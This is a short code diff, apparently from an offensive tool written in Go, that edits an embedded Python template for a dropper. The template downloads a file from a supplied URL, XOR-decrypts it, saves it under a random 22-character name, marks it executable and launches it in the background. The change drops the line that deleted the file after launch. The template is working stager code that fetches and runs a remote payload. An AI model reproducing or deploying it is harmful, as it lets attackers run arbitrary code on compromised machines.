@@ -30,8 +30,7 @@ def xor_decrypt(key,ciphertext):return ''.join([chr(ord(B)^ord(key[A%%len(key)])
 def download_file(url):A=urllib2.urlopen(url);B=A.read();return B
 open(_A,'wb+').write(xor_decrypt('%s',download_file('%s')))
 os.chmod(_A,0o755)
-os.system('./%%s&'%%_A)
-os.remove(_A)`, util.RandStr(22), key, url)
+os.system('./%%s&'%%_A)`, util.RandStr(22), key, url)
 
 	return []byte(py_template)
 }
